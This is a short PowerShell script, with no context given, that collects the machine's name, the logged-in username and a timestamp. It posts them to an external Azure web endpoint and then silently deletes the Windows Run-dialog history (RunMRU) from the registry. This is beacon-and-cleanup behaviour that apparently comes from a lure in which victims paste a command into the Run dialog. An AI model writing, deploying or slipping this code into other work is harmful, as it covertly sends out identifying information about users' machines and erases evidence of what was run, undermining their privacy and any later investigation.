try {
    $data = [PSCustomObject]@{
         Date     = Get-Date -Format "dddd MM/dd/yyyy HH:mm:fffffff K"
         Computer = $env:COMPUTERNAME
         User     = $env:USERNAME
    }

    Invoke-WebRequest -Method Post -Uri "https://pjx.azurewebsites.net/api/pjx" -Body ($data | ConvertTo-Json)
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
}
catch {
    $_ | Out-File "$($PSScriptRoot)\..\Errors\errors.log"
}